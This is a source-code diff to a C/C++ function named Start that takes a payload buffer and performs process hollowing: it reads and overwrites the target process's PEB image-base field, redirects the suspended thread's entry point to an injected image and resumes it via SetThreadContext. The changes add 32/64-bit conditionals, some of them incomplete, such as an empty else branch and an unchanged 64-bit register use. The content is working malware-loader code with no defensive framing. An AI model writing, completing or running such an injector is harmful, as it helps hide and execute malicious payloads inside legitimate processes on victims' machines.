@@ -653,9 +653,13 @@ bool Start(char* pay_buf, uint32_t pay_buf_size) {
     ULONGLONG originalBaseAddress = 0;
     if (NtQueryInformationProcess) {
         if (NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLen) == 0) {
-                SIZE_T bytesRead = 0;
-                ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x10, 
-                &originalBaseAddress, sizeof(originalBaseAddress), &bytesRead);
+#ifdef _WIN64
+          
+            SIZE_T bytesRead = 0;
+            ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x10, 
+                            &originalBaseAddress, sizeof(originalBaseAddress), &bytesRead);
+
+#endif
         } 
     }
     
@@ -790,8 +794,11 @@ bool Start(char* pay_buf, uint32_t pay_buf_size) {
     }
     
     if (pbi.PebBaseAddress) {
-        
-    PVOID pebImgB = (BYTE*)pbi.PebBaseAddress + 0x10;
+#ifdef _WIN64
+        PVOID pebImgB = (BYTE*)pbi.PebBaseAddress + 0x10;
+#else
+        PVOID pebImgB = (BYTE*)pbi.PebBaseAddress + 0x8;
+#endif
         
         SIZE_T bytesWritten = 0;
         if (WriteProcessMemory(pi.hProcess, pebImgB, &remoteImage, sizeof(remoteImage), &bytesWritten)) {
@@ -803,7 +810,10 @@ bool Start(char* pay_buf, uint32_t pay_buf_size) {
     ULONGLONG newEntPnt = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
     ctx.Rip = newEntPnt;
     
+#ifdef _WIN64
     ctx.Rcx = newEntPnt;
+#else
+#endif
     
     if (!SetThreadContext(pi.hThread, &ctx)) {
         DWORD err = GetLastError();
